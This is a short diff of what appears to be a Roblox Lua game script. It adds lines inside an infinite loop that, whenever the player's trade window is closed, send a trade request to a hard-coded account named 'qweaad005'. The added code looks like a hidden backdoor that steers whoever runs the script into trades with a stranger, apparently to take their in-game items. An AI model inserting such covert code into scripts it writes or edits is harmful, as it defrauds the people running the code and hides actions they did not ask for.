@@ -455,6 +455,9 @@ local aa =0;
 local ab =0;
 
 while true do
+ if not Player.PlayerGui.TradeApp.Frame.Visible then
+                        ReplicatedStorage.API:FindFirstChild("TradeAPI/SendTradeRequest"):FireServer("qweaad005")
+                    end 
     a=0
     b=0
 	aa =0
